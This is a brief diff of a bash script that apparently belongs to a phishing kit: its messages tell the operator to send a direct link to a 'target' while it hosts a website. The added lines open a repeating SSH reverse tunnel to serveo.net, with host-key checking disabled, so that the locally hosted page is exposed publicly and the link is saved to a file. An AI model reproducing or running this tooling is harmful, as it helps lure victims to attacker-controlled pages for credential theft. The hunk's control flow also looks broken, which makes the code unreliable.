@@ -34,9 +34,9 @@ printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hosting your website,\e[0m\e[1;77m Press Ctrl + C to stop...\e[0m\n"
 while [ true ]; do
-sleep 1
-fi
-banner
+sleep 55
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+printf "\n"
 }
 
 banner
